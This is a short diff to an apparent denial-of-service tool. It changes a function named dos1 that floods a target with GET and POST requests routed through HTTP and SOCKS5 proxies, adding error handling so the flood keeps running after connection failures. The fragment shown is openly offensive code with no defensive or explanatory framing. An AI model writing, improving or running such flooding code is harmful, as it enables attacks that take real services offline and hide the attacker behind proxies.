@@ -34,10 +34,13 @@ def dos1(target):
             'http': f'socks5://{proxyagentsocks}',
             'https': f'socks5://{proxyagentsocks}'
         }
-        s.get(target, headers=header, proxies=proxieshttp)
-        s.post(target, headers=header, proxies=proxieshttp)
-        s.get(target, headers=header2, proxies=proxiessocks)
-        s.post(target, headers=header2, proxies=proxiessocks)
+        try:
+            s.get(target, headers=header, proxies=proxieshttp)
+            s.post(target, headers=header, proxies=proxieshttp)
+            s.get(target, headers=header2, proxies=proxiessocks)
+            s.post(target, headers=header2, proxies=proxiessocks)
+        except requests.exceptions.ConnectionError:
+            print(colorama.Fore.RED + "[-] Connection error!")
 
 
 def dos2(target):
